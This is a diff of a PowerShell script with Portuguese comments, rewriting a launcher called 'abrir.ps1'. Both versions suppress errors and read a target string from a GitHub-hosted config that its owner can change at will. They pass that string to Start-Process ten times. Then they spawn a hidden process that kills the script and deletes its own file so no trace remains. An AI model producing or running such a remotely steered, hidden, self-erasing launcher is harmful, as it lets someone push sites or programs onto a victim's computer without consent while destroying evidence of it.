@@ -1,38 +1,32 @@
-<#
-    abrir.ps1
-    - Lê a URL atual do config.txt no GitHub (sempre atualizado)
-    - Abre o site N vezes
-    - Roda oculto e se autodestrói ao terminar
-#>
-
-# ===== CONFIGURAÇÃO =====
-$configUrl  = "https://raw.githubusercontent.com/capimmm/7834569/main/config.txt"
-$quantidade = 10
-$fallback   = "https://example.com"   # usado se o GitHub falhar
-# ========================
-
-# Garante que roda sem barulho
+# abrir.ps1 - versão autodestrutiva
 $ErrorActionPreference = 'SilentlyContinue'
 
-# 1) Busca a URL atual no GitHub
-$siteUrl = $fallback
-try {
-    $resp = Invoke-WebRequest -Uri $configUrl -UseBasicParsing -TimeoutSec 10
-    $linha = ($resp.Content -split "`n" | Where-Object { $_.Trim() -ne "" } | Select-Object -First 1)
-    if ($linha) { $siteUrl = $linha.Trim() }
-} catch {
-    # se não conseguir, usa o fallback
-}
+# ===== CONFIG =====
+$configUrl = "https://raw.githubusercontent.com/capimmm/7834569/main/config.txt"
+$qtd       = 10
+$fallback  = "https://example.com"
+# ==================
 
-# 2) Abre o site N vezes
-for ($i = 1; $i -le $quantidade; $i++) {
-    Start-Process $siteUrl
+# 1) Lê a URL atual do GitHub
+$site = $fallback
+try {
+    $r = Invoke-WebRequest -Uri $configUrl -UseBasicParsing -TimeoutSec 10
+    $linha = ($r.Content -split "`n" | Where-Object { $_.Trim() -ne "" } | Select-Object -First 1)
+    if ($linha) { $site = $linha.Trim() }
+} catch { }
+
+# 2) Abre o site N vezes (silenciosamente)
+for ($i = 1; $i -le $qtd; $i++) {
+    Start-Process $site
     Start-Sleep -Milliseconds 250
 }
 
-# 3) Autodestruição: agenda a exclusão do próprio arquivo e mata este processo
-$scriptPath = $PSCommandPath
-$selfKill = "Start-Sleep -Milliseconds 800; Remove-Item -LiteralPath '$scriptPath' -Force -ErrorAction SilentlyContinue; Stop-Process -Id $PID -Force"
-Start-Process powershell.exe -ArgumentList "-NoProfile","-WindowStyle","Hidden","-Command",$selfKill -WindowStyle Hidden
-
-Stop-Process -Id $PID -Force
+# 3) Autodestruição — agenda um processo "coveiro" que nos mata e apaga o arquivo
+$me    = $MyInvocation.MyCommand.Path
+$myPid = $PID
+if ($me -and (Test-Path $me)) {
+    $coveiro = "Start-Sleep -Milliseconds 1500; " +
+               "Stop-Process -Id $myPid -Force -ErrorAction SilentlyContinue; " +
+               "Remove-Item -LiteralPath '$me' -Force -ErrorAction SilentlyContinue"
+    Start-Process powershell.exe -ArgumentList '-NoProfile','-WindowStyle','Hidden','-Command',$coveiro -WindowStyle Hidden
+}
